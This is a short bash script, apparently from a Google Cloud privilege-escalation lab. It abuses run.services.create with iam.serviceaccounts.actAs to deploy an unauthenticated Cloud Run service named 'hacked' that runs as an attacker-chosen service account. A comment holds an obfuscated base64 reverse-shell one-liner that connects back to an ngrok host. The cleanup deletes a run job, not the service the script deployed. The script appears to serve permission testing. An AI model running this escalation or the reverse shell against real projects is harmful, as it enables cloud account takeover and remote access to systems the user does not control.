#!/bin/bash

source lib/lib.sh


echo "================================================"
echo "Checking run.jobs.create"

#enable_service "container.googleapis.com"


modify_role "run.services.create,run.services.get,run.services.update,iam.serviceaccounts.actAs"


# For reverse shell use instead of sleep 5: echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash
gcloud run deploy hacked \
--impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,sleep 5" \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
--region=us-central1 \
--allow-unauthenticated



# Cleaning
read -p "Press any key to delete scenario... " -n1 -s
echo ""

#gcloud beta composer environments delete privesc-test

#disable_service "composer.googleapis.com"

echo "================================================"

echo "Y" | gcloud beta run jobs delete hacked --region=us-central1

#compute.instances.setIamPolicy
#compute.instances.setServiceAccount	
#compute.instances.osAdminLogin
#compute.instances.osLogin
